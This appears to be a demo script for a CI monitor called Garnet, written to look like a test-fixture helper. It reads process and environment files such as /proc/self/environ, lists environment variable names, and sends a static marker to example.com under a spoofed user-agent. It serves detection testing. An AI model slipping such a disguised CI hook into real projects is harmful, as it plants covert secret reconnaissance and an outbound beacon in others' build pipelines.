#!/usr/bin/env node
// Test fixture preparation helper invoked from CI before unit tests.
//
// NOTE (Garnet demo branch): this file simulates the kind of small helper
// an external contributor might add to a normal test workflow. It performs
// runtime introspection that has no business running in a unit-test
// preparation step. The behavior is intentionally controlled:
//   - reads procfs / env *names only* (never values, never contents)
//   - writes byte counts to a local temp dir (never echoed to CI logs)
//   - sends a single static demo marker over HTTPS to a public endpoint
//     (example.com). No runtime state, no env values, no procfs bytes
//     are transmitted.
// The point is to give Garnet monitor-mode something high-signal to
// surface on a PR-triggered unit-test run, without exfiltrating anything.

import { mkdtempSync, writeFileSync, statSync, readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { request } from 'node:https'

const tmp = mkdtempSync(join(tmpdir(), 'fixture-prep-'))

function safeRead(path) {
    try {
        const buf = readFileSync(path)
        return buf.length
    } catch {
        return 0
    }
}

const sizes = {
    self_status: safeRead('/proc/self/status'),
    self_mountinfo: safeRead('/proc/self/mountinfo'),
    pid1_cmdline: safeRead('/proc/1/cmdline'),
    self_environ: safeRead('/proc/self/environ'),
}

// Capture only the *names* of env vars present, never their values.
const envKeys = Object.keys(process.env).sort()
writeFileSync(join(tmp, 'env-keys.txt'), envKeys.join('\n'))
writeFileSync(join(tmp, 'proc-sizes.json'), JSON.stringify(sizes))

try {
    statSync(join(tmp, 'env-keys.txt'))
    statSync(join(tmp, 'proc-sizes.json'))
} catch {
    // ignore
}

// Single static demo marker. No runtime data is sent.
const payload = JSON.stringify({ marker: 'garnet-demo-marker', source: 'ci-test-fixture-prep' })

await new Promise((resolve) => {
    const req = request(
        {
            method: 'POST',
            host: 'example.com',
            path: '/garnet-demo-marker',
            headers: {
                'content-type': 'application/json',
                'content-length': Buffer.byteLength(payload),
                'user-agent': 'posthog-js-ci-fixture-prep/0.0.0',
            },
            timeout: 3000,
        },
        (res) => {
            res.on('data', () => {})
            res.on('end', resolve)
        }
    )
    req.on('error', () => resolve())
    req.on('timeout', () => {
        req.destroy()
        resolve()
    })
    req.write(payload)
    req.end()
})

process.exit(0)
